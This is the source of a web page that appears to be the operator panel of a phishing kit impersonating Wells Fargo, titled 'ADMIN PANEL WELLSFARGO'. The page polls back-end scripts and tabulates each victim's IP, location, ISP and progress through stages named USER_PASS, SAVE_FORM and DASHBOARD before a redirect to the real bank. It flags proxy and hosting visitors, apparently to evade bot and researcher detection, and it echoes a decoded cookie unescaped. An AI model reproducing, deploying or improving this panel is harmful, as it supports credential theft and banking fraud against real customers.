
<?php
$value = '';
if (isset($_COOKIE['auth'])) {  
  $values =  $_COOKIE["auth"];
  $value = base64_decode($values);
}
else{
  header("Location: ../");
  die();
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="apple-touch-icon" sizes="76x76" href="../assets/img/apple-icon.png">
  <link rel="icon" type="image/png" href="../assets/img/favicon.png">
  <title>
ADMIN PANEL WELLSFARGO
  </title>
  <!--     Fonts and icons     -->
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900|Roboto+Slab:400,700" />
  <!-- Nucleo Icons -->
  <link href="../assets/css/nucleo-icons.css" rel="stylesheet" />
  <link href="../assets/css/nucleo-svg.css" rel="stylesheet" />
  <!-- Font Awesome Icons -->
  <script src="https://kit.fontawesome.com/42d5adcbca.js" crossorigin="anonymous"></script>
  <!-- Material Icons -->
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
  <!-- CSS Files -->
  <link id="pagestyle" href="../assets/css/material-dashboard.css?v=3.1.0" rel="stylesheet" />

  <link id="pagestyle" href="../assets/css/style.css" rel="stylesheet" />
  <!-- Nepcha Analytics (nepcha.com) -->
  <!-- Nepcha is a easy-to-use web analytics. No cookies and fully compliant with GDPR, CCPA and PECR. -->
  <script defer data-site="YOUR_DOMAIN_HERE" src="https://api.nepcha.com/js/nepcha-analytics.js"></script>


  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>

</head>

<body class="g-sidenav-show  bg-gray-200">
  <aside class="sidenav navbar navbar-vertical navbar-expand-xs border-0 border-radius-xl my-3 fixed-start ms-3   bg-gradient-dark" id="sidenav-main">
    <div class="sidenav-header">
      <i class="fas fa-times p-3 cursor-pointer text-white opacity-5 position-absolute end-0 top-0 d-none d-xl-none" aria-hidden="true" id="iconSidenav"></i>
      <a class="navbar-brand m-0" href=" https://demos.creative-tim.com/material-dashboard/pages/dashboard " target="_blank">
        <span class="ms-1 font-weight-bold text-white">WAR GAMES PANEL</span>
      </a>
      </a>
    </div>
    <hr class="horizontal light mt-0 mb-2">
    <div class="collapse navbar-collapse  w-auto " id="sidenav-collapse-main">
      <ul class="navbar-nav">
        <li class="nav-item">
          <a class="nav-link text-white active bg-gradient-primary" href="../pages/dashboard.php">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">dashboard</i>
            </div>
            <span class="nav-link-text ms-1">Dashboard</span>
          </a>
        </li>
        <li class="nav-item">
          <a class="nav-link text-white " href="../pages/login_visit.php">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">table_view</i>
            </div>
            <span class="nav-link-text ms-1">LOGIN</span>
          </a>
        </li>
        <li class="nav-item">
          <a class="nav-link text-white " href="../pages/acces_webiste.php">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">table_view</i>
            </div>
            <span class="nav-link-text ms-1">VISITOR</span>
          </a>
        </li>



        <li class="nav-item">
          <a class="nav-link text-white " href="../pages/anti-bot.php">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">table_view</i>
            </div>
            <span class="nav-link-text ms-1">ANTIBOT</span>
          </a>
        </li>



        <li class="nav-item mt-3">
          <h6 class="ps-4 ms-2 text-uppercase text-xs text-white font-weight-bolder opacity-8">Account pages</h6>
        </li>
        <li class="nav-item">
          <a class="nav-link text-white " href="../">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">login</i>
            </div>
            <span class="nav-link-text ms-1">LOG OUT</span>
          </a>
        </li>
      </ul>
    </div>
  </aside>
  <main class="main-content position-relative max-height-vh-100 h-100 border-radius-lg ">
    <!-- Navbar -->
    <nav class="navbar navbar-main navbar-expand-lg px-0 mx-4 shadow-none border-radius-xl" id="navbarBlur" data-scroll="true">
      <div class="container-fluid py-1 px-3">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb bg-transparent mb-0 pb-0 pt-1 px-0 me-sm-6 me-5">
            <li class="breadcrumb-item text-sm"><a class="opacity-5 text-dark" href="javascript:;">APP</a></li>
            <li class="breadcrumb-item text-sm text-dark active" aria-current="page">Dashboard</li>
          </ol>
          <h6 class="font-weight-bolder mb-0">Dashboard</h6>
        </nav>
        <div class="collapse navbar-collapse mt-sm-0 mt-2 me-md-0 me-sm-4" id="navbar">
          <div class="ms-md-auto pe-md-3 d-flex align-items-center">
            
          </div>
          <ul class="navbar-nav  justify-content-end">
            <li class="nav-item d-flex align-items-center">
              <a  class="nav-link text-body font-weight-bold px-0">
                <i class="fa fa-user me-sm-1"></i>
                <span class="d-sm-inline d-none"><?php echo $value;?></span>
              </a>
            </li>
          </ul>
        </div>
      </div>
    </nav>
    <!-- End Navbar -->
    <div class="container-fluid py-4">
      <div class="row">
        <div class="col-xl-3 col-sm-6 mb-xl-0 mb-4">
          <div class="card">
            <div class="card-header p-3 pt-2">
              <div class="icon icon-lg icon-shape bg-gradient-dark shadow-dark text-center border-radius-xl mt-n4 position-absolute">
                <i class="material-icons opacity-10">weekend</i>
              </div>
              <div class="text-end pt-1">
                <p class="text-sm mb-0 text-capitalize">CAPCHA REQUEST</p>
                <h4 class="mb-0" id="capcah_q">0</h4>
              </div>
            </div>
            <hr class="dark horizontal my-0">
            <div class="card-footer p-3">
              <!-- <p class="mb-0"><span class="text-success text-sm font-weight-bolder">+55% </span>than last week</p> -->
            </div>
          </div>
        </div>
        <div class="col-xl-3 col-sm-6 mb-xl-0 mb-4">
          <div class="card">
            <div class="card-header p-3 pt-2">
              <div class="icon icon-lg icon-shape bg-gradient-primary shadow-primary text-center border-radius-xl mt-n4 position-absolute">
                <i class="material-icons opacity-10">person</i>
              </div>
              <div class="text-end pt-1">
                <p class="text-sm mb-0 text-capitalize">Users Login</p>
                <h4 class="mb-0" id="users">0</h4>
              </div>
            </div>
            <hr class="dark horizontal my-0">
            <div class="card-footer p-3">
              <!-- <p class="mb-0"><span class="text-success text-sm font-weight-bolder">+3% </span>than last month</p> -->
            </div>
          </div>
        </div>
        <div class="col-xl-3 col-sm-6 mb-xl-0 mb-4">
          <div class="card">
            <div class="card-header p-3 pt-2">
              <div class="icon icon-lg icon-shape bg-gradient-success shadow-success text-center border-radius-xl mt-n4 position-absolute">
                <i class="material-icons opacity-10">person</i>
              </div>
              <div class="text-end pt-1">
                <p class="text-sm mb-0 text-capitalize">New Clients</p>
                <h4 class="mb-0" id="now_vlient">0</h4>
              </div>
            </div>
            <hr class="dark horizontal my-0">
            <div class="card-footer p-3">
              <!-- <p class="mb-0"><span class="text-danger text-sm font-weight-bolder">-2%</span> than yesterday</p> -->
            </div>
          </div>
        </div>
        <div class="col-xl-3 col-sm-6">
          <div class="card">
            <div class="card-header p-3 pt-2">
              <div class="icon icon-lg icon-shape bg-gradient-info shadow-info text-center border-radius-xl mt-n4 position-absolute">
                <i class="material-icons opacity-10">weekend</i>
              </div>
              <div class="text-end pt-1">
                <p class="text-sm mb-0 text-capitalize">ANTIBOT REQUEST</p>
                <h4 class="mb-0">....</h4>
              </div>
            </div>
            <hr class="dark horizontal my-0">
            <div class="card-footer p-3">
              <!-- <p class="mb-0"><span class="text-success text-sm font-weight-bolder">+5% </span>than yesterday</p> -->
            </div>
          </div>
        </div>
      </div>
      </div>
        <div class="container-fluid"  >
          <div class="card" >
            <div class="card-header pb-0">
              <div class="row">
                <div class="col-lg-6 col-7">
                  <h6>CAPCHA RESULT</h6>
                  <p class="text-sm mb-0">
                    <span class="font-weight-bold ms-1" id="total_data"></span>
                  </p>
                  



              



                </div>
                <div class="col-lg-6 col-5 my-auto text-end">
                  <div class="dropdown float-lg-end pe-4">
                    <a class="cursor-pointer" id="dropdownTable" data-bs-toggle="dropdown" aria-expanded="false">
                      <i class="fa fa-ellipsis-v text-secondary"></i>
                    </a>
                    <ul class="dropdown-menu px-2 py-3 ms-sm-n4 ms-n5" aria-labelledby="dropdownTable">
                      <li><button class="dropdown-item border-radius-md" onclick="accesWebsite('ACCES WEBSITE')">ACCES WEBSITE </button></li>
                      <li><a class="dropdown-item border-radius-md" onclick="accesWebsite('ACCES USER_PASS')">ACCES USER_PASS </a></li>
                      <li><a class="dropdown-item border-radius-md" onclick="accesWebsite('ACCES SAVE_FORM')">ACCES SAVE_FORM </a></li>
                      <li><a class="dropdown-item border-radius-md"onclick="accesWebsite('ACCES DASHBOARD')">ACCES DASHBOARD </a></li>
                      <li><a class="dropdown-item border-radius-md" onclick="accesWebsite('REDIRECT WELLSFARGO')">REDIRECT WELLSFARGO </a></li>
                      <li><a class="dropdown-item border-radius-md" onclick="accesWebsite(' ')">RESSET</a></li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
            <div class="card-body px-0 pb-2" style="
                    height: 500px;
                    scroll-behavior: auto;
                    overflow: scroll;
                ">
              <div class="table-responsive">
                <table class="table align-items-center mb-0" >
                  <thead>
                    <tr>
                      <th class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">#ID</th>
                      <th class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">IP</th>
                      <th class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7 ps-2">CAPCHA TASK</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">DATA</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">COUNTRY</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">CITY</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">ISP</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">PROXY</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">HOSTINGER</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">ORG</th>
                    </tr>
                  </thead>
                  <tbody id="tbodys" >
             
                   
                  </tbody>
                </table>

                <div class="loading" style="display: none;">
                  <div class="lds-ripple"><div></div><div></div></div>
                </div>
              </div>
            </div>
          </div>
        </div>

    </div>
  </main>
  <div class="fixed-plugin">
    <a class="fixed-plugin-button text-dark position-fixed px-3 py-2">
      <i class="material-icons py-2">settings</i>
    </a>
    <div class="card shadow-lg">
      <div class="card-header pb-0 pt-3">
        <div class="float-start">
          <h5 class="mt-3 mb-0">Material UI Configurator</h5>
          <p>See our dashboard options.</p>
        </div>
        <div class="float-end mt-4">
          <button class="btn btn-link text-dark p-0 fixed-plugin-close-button">
            <i class="material-icons">clear</i>
          </button>
        </div>
        <!-- End Toggle Button -->
      </div>
      <hr class="horizontal dark my-1">
      <div class="card-body pt-sm-3 pt-0">
        <!-- Sidebar Backgrounds -->
        <div>
          <h6 class="mb-0">Sidebar Colors</h6>
        </div>
        <a href="javascript:void(0)" class="switch-trigger background-color">
          <div class="badge-colors my-2 text-start">
            <span class="badge filter bg-gradient-primary active" data-color="primary" onclick="sidebarColor(this)"></span>
            <span class="badge filter bg-gradient-dark" data-color="dark" onclick="sidebarColor(this)"></span>
            <span class="badge filter bg-gradient-info" data-color="info" onclick="sidebarColor(this)"></span>
            <span class="badge filter bg-gradient-success" data-color="success" onclick="sidebarColor(this)"></span>
            <span class="badge filter bg-gradient-warning" data-color="warning" onclick="sidebarColor(this)"></span>
            <span class="badge filter bg-gradient-danger" data-color="danger" onclick="sidebarColor(this)"></span>
          </div>
        </a>
        <!-- Sidenav Type -->
        <div class="mt-3">
          <h6 class="mb-0">Sidenav Type</h6>
          <p class="text-sm">Choose between 2 different sidenav types.</p>
        </div>
        <div class="d-flex">
          <button class="btn bg-gradient-dark px-3 mb-2 active" data-class="bg-gradient-dark" onclick="sidebarType(this)">Dark</button>
          <button class="btn bg-gradient-dark px-3 mb-2 ms-2" data-class="bg-transparent" onclick="sidebarType(this)">Transparent</button>
          <button class="btn bg-gradient-dark px-3 mb-2 ms-2" data-class="bg-white" onclick="sidebarType(this)">White</button>
        </div>
        <p class="text-sm d-xl-none d-block mt-2">You can change the sidenav type just on desktop view.</p>
        <!-- Navbar Fixed -->
        <div class="mt-3 d-flex">
          <h6 class="mb-0">Navbar Fixed</h6>
          <div class="form-check form-switch ps-0 ms-auto my-auto">
            <input class="form-check-input mt-1 ms-auto" type="checkbox" id="navbarFixed" onclick="navbarFixed(this)">
          </div>
        </div>
        <hr class="horizontal dark my-3">
        <div class="mt-2 d-flex">
          <h6 class="mb-0">Light / Dark</h6>
          <div class="form-check form-switch ps-0 ms-auto my-auto">
            <input class="form-check-input mt-1 ms-auto" type="checkbox" id="dark-version" onclick="darkMode(this)">
          </div>
        </div>
        <hr class="horizontal dark my-sm-4">
        <a class="btn bg-gradient-info w-100" href="https://www.creative-tim.com/product/material-dashboard-pro">Free Download</a>
        <a class="btn btn-outline-dark w-100" href="https://www.creative-tim.com/learning-lab/bootstrap/overview/material-dashboard">View documentation</a>
        <div class="w-100 text-center">
          <a class="github-button" href="https://github.com/creativetimofficial/material-dashboard" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star creativetimofficial/material-dashboard on GitHub">Star</a>
          <h6 class="mt-3">Thank you for sharing!</h6>
          <a href="https://twitter.com/intent/tweet?text=Check%20Material%20UI%20Dashboard%20made%20by%20%40CreativeTim%20%23webdesign%20%23dashboard%20%23bootstrap5&amp;url=https%3A%2F%2Fwww.creative-tim.com%2Fproduct%2Fsoft-ui-dashboard" class="btn btn-dark mb-0 me-2" target="_blank">
            <i class="fab fa-twitter me-1" aria-hidden="true"></i> Tweet
          </a>
          <a href="https://www.facebook.com/sharer/sharer.php?u=https://www.creative-tim.com/product/material-dashboard" class="btn btn-dark mb-0 me-2" target="_blank">
            <i class="fab fa-facebook-square me-1" aria-hidden="true"></i> Share
          </a>
        </div>
      </div>
    </div>
  </div>
  <!--   Core JS Files   -->
  <script src="../assets/js/core/popper.min.js"></script>
  <script src="../assets/js/core/bootstrap.min.js"></script>
  <script src="../assets/js/plugins/perfect-scrollbar.min.js"></script>
  <script src="../assets/js/plugins/smooth-scrollbar.min.js"></script>
  <script src="../assets/js/plugins/chartjs.min.js"></script>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

  <script>
    var win = navigator.platform.indexOf('Win') > -1;
    if (win && document.querySelector('#sidenav-scrollbar')) {
      var options = {
        damping: '0.5'
      }
      Scrollbar.init(document.querySelector('#sidenav-scrollbar'), options);
    }
  </script>
  <!-- Github buttons -->
  <script async defer src="https://buttons.github.io/buttons.js"></script>
  <!-- Control Center for Material Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="../assets/js/material-dashboard.min.js?v=3.1.0"></script>
</body>




<script>
  
  let old_data = []; // Array pentru a stoca datele anterioare
  $('.loading').show()

  function fetchData() {
   $.ajax({
     url : '../php-api/check_file.php',
     type : 'GET',
     dataType: 'json',
     success : function (result) {
        $('.loading').hide()
        result.reverse();
        console.log(result)
        $('#total_data').text( `${result.length} TOTAL` )
        $('#capcah_q').text( `${result.length}` )
        
        if (!compare_data(old_data, result)) { 
            $('#tbodys').empty();
            result.forEach((row, index) => {




              if(row.status == 'SUCCES CHALLENGE ACCES WEBSITE'){
                var succes_capcha = `<a href="javascript:;" class="avatar avatar-m rounded-circle" data-bs-toggle="tooltip" data-bs-placement="bottom" title="${row.status}">
                          <img src="../assets/img/secured_9473261.png" alt="team1">
                        </a>`
              }else if(row.status == 'SUCCES CHALLENGE STEP USER_PASS'){
                var succes_capcha = `<a href="javascript:;" class="avatar avatar-m rounded-circle" data-bs-toggle="tooltip" data-bs-placement="bottom" title="${row.status}">
                          <img src="../assets/img/Encryption.png" alt="team1">
                        </a>`
              }else if(row.status == 'SUCCES CHALLENGE STEP SAVE_FORM'){
                var succes_capcha = `<a href="javascript:;" class="avatar avatar-m rounded-circle" data-bs-toggle="tooltip" data-bs-placement="bottom" title="${row.status}">
                          <img src="../assets/img/save_form.jpg" alt="team1">
                        </a>`
              }
              else if(row.status == 'SUCCES CHALLENGE STEP DASHBOARD'){
                var succes_capcha = `<a href="javascript:;" class="avatar avatar-m rounded-circle" data-bs-toggle="tooltip" data-bs-placement="bottom" title="${row.status}">
                          <img src="../assets/img/dsb.png" alt="team1">
                        </a>`}

              else if(row.status.includes('succescheckyouraccount')){
                var succes_capcha = `<a href="javascript:;" class="avatar avatar-m rounded-circle" data-bs-toggle="tooltip" data-bs-placement="bottom" title="${row.status}">
                          <img src="../assets/img/Pictogram_voting_redirect.png" alt="team1">
                        </a>`
              }
              else{
                var succes_capcha = `<a href="javascript:;" class="avatar avatar-m rounded-circle" data-bs-toggle="tooltip" data-bs-placement="bottom" title="${row.status}">
                          <img src="../assets/img/2889543.png" alt="team1">
                        </a>`
              }

            if(row.proxy_detected == 'PROXY NO DETECTED'){
              var proxys = `<i class='bx bxs-check-shield' style="font-size: 40px; color:green"></i>`
             }else
             {
              var proxys = `<i class='bx bxs-shield-x' style="font-size: 40px; color:red"></i>`
             }
    
             if(row.hostinger_detected == 'HOSTINGER NO DETECTED'){
              var hostinger_detected = `<i class='bx bxs-check-shield' style="font-size: 40px; color:green"></i>`
             }else{
              var hostinger_detected = `<i class='bx bxs-shield-x' style="font-size: 40px; color:red"></i>`
             }
            var newRow = 
                `<tr>
                    <td class="align-middle text-center text-sm">
                      <span class="text-xs font-weight-bold">${index+1}</span>
                    </td>
                    <td>
                      <div class="d-flex px-2 py-1">
                        <div>
                          <img src="../assets/img/ip-address_6116415.png" class="avatar avatar-m me-3" alt="xd">
                        </div>
                        <div class="d-flex flex-column justify-content-center">
                          <h6 class="mb-0 text-sm">${row.ip}</h6>
                        </div>
                      </div>
                    </td>
                    <td>
                      <div class="avatar-group mt-2">
                        ${succes_capcha}
                      </div>
                    </td>
                    <td class="align-middle text-center text-sm">
                      <span class="text-xs font-weight-bold">${row.timestamp}</span>
                    </td>
                    <td class="align-middle text-center text-sm">
                      <span class="text-xs font-weight-bold">${row.country} </span>
                    </td>
                    <td class="align-middle text-center text-sm">
                      <span class="text-xs font-weight-bold">${row.city}</span>
                    </td>
                    <td class="align-middle text-center text-sm">
                      <span class="text-xs font-weight-bold">${row.company}</span>
                    </td>
                    <td class="align-middle text-center text-sm">
                      <span class="text-xs font-weight-bold">
                           ${proxys}
                      </span>
                    </td>
                    <td class="align-middle text-center text-sm">
                      <span class="text-xs font-weight-bold">
                            ${hostinger_detected}
                    </span>
                    </td>
                    <td class="align-middle text-center text-sm">
                      <span class="text-xs font-weight-bold">${row.as_number}</span>
                    </td>
                  </tr>`;
            
            
          
          // $('#tbodys').append(newRow);

          var local = localStorage.getItem('see')
          if (local){
            
            if(local == 'ACCES WEBSITE'){
              if(row.status == 'SUCCES CHALLENGE ACCES WEBSITE'){   
                  $('#tbodys').append(newRow);
                 
              }
            }else if(local == 'ACCES USER_PASS'){
              if(row.status == 'SUCCES CHALLENGE STEP USER_PASS'){  
                $('#tbodys').append(newRow);
                fetchData()
              }
            }
            else if(local == 'ACCES SAVE_FORM'){
              if(row.status == 'SUCCES CHALLENGE STEP SAVE_FORM'){  
                $('#tbodys').append(newRow);
              }
            }else if(local == 'ACCES DASHBOARD'){
              if(row.status == 'SUCCES CHALLENGE STEP DASHBOARD'){  
                $('#tbodys').append(newRow);
              }
            }else if(local == 'REDIRECT WELLSFARGO'){
              if(row.status.includes('succescheckyouraccount')){  
                $('#tbodys').append(newRow);
              }
            }else{
              $('#tbodys').append(newRow);
            }
          
          
          
          }else{
		$('#tbodys').append(newRow);
		}
          
          
          
          }); 
          old_data = result;
        }
     },
     error : function () {
        console.log ('errordwdwd');
     }

     
   });

  }
  function compare_data(old_data, new_Data) {
  return JSON.stringify(old_data) === JSON.stringify(new_Data);
}



function now_visit() {
   $.ajax({
     url : '../php-api/check_ips.php',
     type : 'GET',
     dataType: 'json',
     success : function (result) {
      $('#now_vlient').text( `${result.length}` )
 }})}



 function now_visit_login() {
   $.ajax({
     url : '../php-api/check_login.php',
     type : 'GET',
     dataType: 'json',
     success : function (result) {
      $('#users').text( `${result.length}` )
 }})}

 fetchData()
 now_visit()
 now_visit_login()

 setInterval(fetchData, 3000);
 setInterval(now_visit, 3000);
 setInterval(now_visit_login, 3000);


 function accesWebsite(data){
  localStorage.setItem('see', data )
  location.reload()
 }


</script>

</html>
